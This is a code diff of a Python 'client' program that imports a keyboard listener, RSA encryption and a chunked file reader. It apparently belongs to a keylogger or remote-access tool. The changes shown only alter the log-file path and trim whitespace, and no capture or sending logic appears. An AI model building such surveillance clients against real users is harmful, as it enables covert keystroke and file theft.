@@ -23,9 +23,9 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
 if platform.system() == 'Windows':
     import ctypes
-    LOG = os.path.dirname(sys.argv[0]) + '\\log.log'
+    LOG = sys.path[0] + '\\log.log'
 else:
-    LOG = os.path.dirname(sys.argv[0]) + '/log.log'
+    LOG = sys.path[0] + '/log.log'
 
 try:
     from pynput.keyboard import Key, Listener
@@ -37,13 +37,13 @@ logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(mes
 logging.info('Client Started.')
 
 
-def read_file(path, block_size=1024): 
-    with open(path, 'rb') as f: 
-        while True: 
-            piece = f.read(block_size) 
-            if piece: 
-                yield piece 
-            else: 
+def read_file(path, block_size=1024):
+    with open(path, 'rb') as f:
+        while True:
+            piece = f.read(block_size)
+            if piece:
+                yield piece
+            else:
                 return
 
 
